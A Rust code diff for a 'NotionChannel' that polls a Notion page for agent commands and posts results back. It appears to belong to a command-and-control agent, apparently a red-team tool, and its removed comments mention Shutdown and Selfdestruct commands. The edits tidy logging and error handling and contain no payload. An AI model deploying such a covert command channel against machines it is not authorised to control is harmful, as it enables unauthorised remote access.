@@ -93,10 +93,8 @@ impl NotionChannel {
     /// Retrieves blocks from Notion. All children blocks of the parent page returned
     /// TODO: Account for pagination for > 100 children.
     pub async fn get_blocks(&self) -> Result<serde_json::Value, String> {
-        self.logger.info(log_out!(URL_BASE));
         let page_id = &self.config.page_id;
         let url = format!("{URL_BASE}/blocks/{page_id}/children");
-        self.logger.debug(log_out!(url));
 
         let r = self.client.get(url).send().await.unwrap();
 
@@ -236,12 +234,13 @@ impl Channel for NotionChannel {
             .unwrap();
         
         
-        if !r.status().is_success() {
+        if r.status().is_success() {
             let result_text = r.text().await.unwrap();
-            self.logger.debug(result_text.to_string());
             Ok(result_text)
         } else {
-            Err(ChannelError::new(&r.text().await.unwrap()))
+            let msg = r.status().as_str().to_owned();
+            println!("{msg}");
+            Err(ChannelError::new(&msg))
         }
     }
 
@@ -263,10 +262,15 @@ impl Channel for NotionChannel {
             .await
             .unwrap();
 
+        
         if !r.status().is_success() {
             let result_text = r.text().await.unwrap();
-            self.logger.debug(result_text);
+            self.logger.debug(log_out!(result_text) );
+        } else {
+            self.logger.debug(log_out!("Command completed"));
         }
+
+        return ();
     }
 
     async fn receive(&self) -> Result<Vec<AgentCommand>, ChannelError> {
@@ -295,16 +299,6 @@ impl Channel for NotionChannel {
                         // Insert the command block id into the `AgentCommand` as `.rel`
                         agent_command.rel = command_block_id.to_string();
                         new_commands.push(agent_command);
-                        // let output = notion_command.handle(&mut config_options, &logger).await?;
-                        // complete_command(&client, block.to_owned(), &logger).await;
-                        // send_result(&client, command_block_id, output, &logger).await;
-                        // // Check for any final work based on command type,
-                        // // Like shutting down the agent
-                        // match notion_command.command_type {
-                        //     CommandType::Shutdown => {exit(0);},
-                        //     CommandType::Selfdestruct => {exit(0)},
-                        //     _ => {}
-                        // }
                     };
                 },
                 None => { continue; }
